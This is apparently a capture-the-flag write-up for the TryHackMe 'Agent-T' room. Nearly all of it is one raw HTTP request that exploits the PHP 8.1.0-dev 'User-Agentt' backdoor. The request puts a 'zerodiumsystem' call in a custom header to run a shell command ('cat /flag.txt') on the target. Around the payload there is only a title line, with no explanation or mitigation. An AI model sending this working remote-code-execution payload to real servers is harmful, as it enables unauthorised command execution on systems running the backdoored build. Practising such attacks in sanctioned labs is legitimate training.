# Agent-T Tryhackme Writeup

1. PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution

```bash
GET / HTTP/1.1
Host: 10.10.31.200
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
User-Agentt: zerodiumsystem('"cat /flag.txt"');
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```
